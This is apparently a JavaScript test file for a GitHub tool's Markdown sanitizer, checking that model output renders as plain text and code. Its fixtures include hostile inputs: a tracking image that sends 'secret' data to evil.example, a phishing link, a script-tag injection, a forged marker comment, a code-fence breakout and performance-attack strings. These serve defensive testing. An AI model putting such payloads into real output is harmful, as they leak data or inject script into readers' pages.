import assert from "node:assert/strict";
import { test } from "node:test";
import MarkdownIt from "markdown-it";
import {
  codeBlock,
  inlineCode,
  modelMarkdown,
  plainText,
  visible,
} from "../src/github/markdown.js";

// A renderer close to GitHub's: raw HTML is allowed, and addresses with a
// scheme or "www." become links. Bare domains do not, as on GitHub.
const markdown = new MarkdownIt({ html: true, linkify: true, breaks: true });
markdown.linkify.set({ fuzzyLink: false });
const render = (text) => markdown.render(text);

/** The text a reader sees: tags removed, entities decoded. */
function shownText(html) {
  return html
    .replace(/<br>\n?/g, "\n")
    .replace(/<[^>]+>/g, "")
    .replace(/&lt;/g, "<")
    .replace(/&gt;/g, ">")
    .replace(/&quot;/g, '"')
    .replace(/&amp;/g, "&")
    .trim();
}

/** Asserts that rendered Markdown holds no element that does more than show text or code. */
function assertOnlyTextAndCode(html, label) {
  const tags = [...html.matchAll(/<\/?([a-z0-9]+)/g)].map((match) => match[1]);
  const allowed = new Set(["p", "br", "code", "pre"]);
  for (const tag of tags) assert.ok(allowed.has(tag), `${label}: <${tag}>`);
  assert.doesNotMatch(html, /<!--/, label);
}

const RLO = String.fromCodePoint(0x202e);

// --- plainText() --------------------------------------------------------------

const DANGEROUS = {
  image: "![tracker](https://evil.example/pixel.png?data=secret)",
  link: "[click here](https://evil.example/login)",
  "raw address": "Read https://evil.example/login now",
  "www address": "See www.evil.example for details",
  "e-mail address": "Write to admin@evil.example today",
  html: '<img src="https://evil.example/x.png"> and <script>alert(1)</script>',
  details: "<details><summary>More</summary>hidden</details>",
  "marker comment": "<!-- reviewops --> forged",
  mention: "Ping @octocat and @octo-org/security-team please",
  "issue reference": "Fixes #12 and octo-org/demo#7 and GH-3",
  heading: "# Not a heading",
  list: "- not\n- a list",
  "ordered list": "1. not a list",
  quote: "> not a quote",
  table: "| a | b |\n|---|---|\n| 1 | 2 |",
  emphasis: "**not bold** and _not italic_ and ~~not struck~~",
  "horizontal rule": "---",
  entity: "&lt;b&gt; stays text &amp; more",
  "line break escape": "trailing backslash\\\nnext",
};

for (const [name, text] of Object.entries(DANGEROUS)) {
  test(`plainText renders a ${name} as the same plain text`, () => {
    const html = render(plainText(text));

    assertOnlyTextAndCode(html, name);
    assert.equal(
      shownText(html).replace(/\s+/g, " "),
      text.replace(/\s+/g, " "),
      name,
    );
  });
}

test("plainText turns addresses, mentions and references into inline code", () => {
  const html = render(
    plainText("Ping @octocat about #12, see https://example.org/a."),
  );

  assert.match(html, /<code>@octocat<\/code>/);
  assert.match(html, /<code>#12<\/code>/);
  assert.match(html, /<code>https:\/\/example\.org\/a\.<\/code>/);
});

test("plainText leaves a mention inside an e-mail address alone", () => {
  assert.equal(plainText("a@b.example"), "`a@b.example`");
});

test("plainText shows invisible characters by their code point", () => {
  const html = render(plainText(`left${RLO}right`));

  assert.equal(shownText(html), "left\\u202eright");
});

test("plainText keeps the placeholder of a masked secret readable", () => {
  const html = render(plainText("The key [REDACTED SECRET] is in the code."));

  assert.equal(shownText(html), "The key [REDACTED SECRET] is in the code.");
  assertOnlyTextAndCode(html, "placeholder");
});

// --- inlineCode() --------------------------------------------------------------

test("inlineCode keeps backticks inside the code", () => {
  for (const text of ["a`b", "a``b", "`start", "end`", "```", "plain"]) {
    const html = render(inlineCode(text));
    assert.equal(shownText(html), text, text);
    assert.match(html, /^<p><code>/, text);
  }
});

test("inlineCode turns line breaks into spaces and renders nothing for empty text", () => {
  assert.equal(shownText(render(inlineCode("a\n\nb"))), "a  b");
  assert.equal(inlineCode(""), "");
});

test("inlineCode does not render HTML or mentions", () => {
  const html = render(inlineCode('<img src="x"> @octocat <!-- reviewops -->'));

  assertOnlyTextAndCode(html, "inline code");
});

// --- codeBlock() ---------------------------------------------------------------

test("codeBlock uses a fence longer than any run of backticks inside", () => {
  const code = "const a = `x`;\n````\nstill code\n```js";

  const block = codeBlock(code, "js");
  const html = render(block);

  assert.ok(block.startsWith("`````js\n"));
  assert.equal(shownText(html), code);
  assert.match(html, /^<pre><code class="language-js">/);
});

test("codeBlock leaves out a language that does not look like one", () => {
  for (const language of ['js"><script>', "a b", "x".repeat(31), "`js`"]) {
    assert.ok(codeBlock("x", language).startsWith("```\n"), language);
  }
  assert.ok(codeBlock("x", "c#").startsWith("```c#\n"));
});

test("codeBlock shows invisible characters by their code point", () => {
  assert.equal(shownText(render(codeBlock(`a${RLO}b`))), "a\\u202eb");
});

// --- modelMarkdown() -----------------------------------------------------------

test("modelMarkdown keeps a fenced code block of the model as code", () => {
  const text =
    "Use a parameter:\n```csharp\nvar rows = db.Query(sql, new { name });\n```\nThat is all.";

  const html = render(modelMarkdown(text));

  assert.match(
    html,
    /<pre><code class="language-csharp">var rows = db.Query\(sql, new \{ name \}\);\n<\/code><\/pre>/,
  );
  assert.match(html, /<p>Use a parameter:<\/p>/);
  assert.match(html, /<p>That is all\.<\/p>/);
});

test("modelMarkdown keeps a code block with tildes and one without an end", () => {
  const tilde = render(modelMarkdown("~~~\n<b>code</b>\n~~~\nafter"));
  const open = render(modelMarkdown("before\n```\n<script>x</script>"));

  assert.match(tilde, /<pre><code>&lt;b&gt;code&lt;\/b&gt;\n<\/code><\/pre>/);
  assert.match(tilde, /<p>after<\/p>/);
  assert.match(
    open,
    /<pre><code>&lt;script&gt;x&lt;\/script&gt;\n<\/code><\/pre>/,
  );
  assertOnlyTextAndCode(open, "open block");
});

test("modelMarkdown cannot be broken out of a code block by its content", () => {
  // As in CommonMark, a longer fence ends the block. What follows is text
  // again, and text is escaped: the image stays text.
  const text = "```\n````\n<img src=x>\n```\n<script>x</script>";

  const html = render(modelMarkdown(text));

  assertOnlyTextAndCode(html, "breakout");
  assert.match(shownText(html), /<img src=x>/);
});

test("modelMarkdown keeps inline code and escapes the text around it", () => {
  const html = render(
    modelMarkdown("Call `execFile()` instead of **exec** with `a``b`."),
  );

  assert.equal(
    html,
    "<p>Call <code>execFile()</code> instead of **exec** with <code>a``b</code>.</p>\n",
  );
});

test("modelMarkdown treats a lone backtick as text", () => {
  const html = render(modelMarkdown("one ` backtick and @octocat"));

  assert.equal(shownText(html), "one ` backtick and @octocat");
  assert.match(html, /<code>@octocat<\/code>/);
});

test("modelMarkdown makes no indented code block of escaped text", () => {
  const html = render(modelMarkdown("text\n\n    indented line"));

  assert.doesNotMatch(html, /<pre>/);
  assert.equal(shownText(html), "text\nindented line");
});

test("modelMarkdown renders every dangerous text as text only", () => {
  for (const [name, text] of Object.entries(DANGEROUS)) {
    assertOnlyTextAndCode(render(modelMarkdown(text)), name);
  }
});

test("modelMarkdown stays fast on long and hostile text", () => {
  const hostile = [
    "a:".repeat(20_000),
    "@".repeat(20_000),
    "`".repeat(20_000),
    "www.".repeat(5_000),
    `${"a".repeat(60)}/`.repeat(500),
    "x@".repeat(20_000),
    "```\n".repeat(5_000),
  ].join("\n");

  const start = performance.now();
  modelMarkdown(hostile);
  assert.ok(performance.now() - start < 2000);
});

// --- visible() -----------------------------------------------------------------

test("visible keeps tabs and line breaks and normalises Windows line ends", () => {
  assert.equal(visible("a\tb\r\nc\rd"), "a\tb\nc\nd");
  assert.equal(visible(`x${String.fromCodePoint(0x2028)}y`), "x\\u2028y");
  assert.equal(visible(`x${String.fromCodePoint(0)}y`), "x\\u0000y");
});
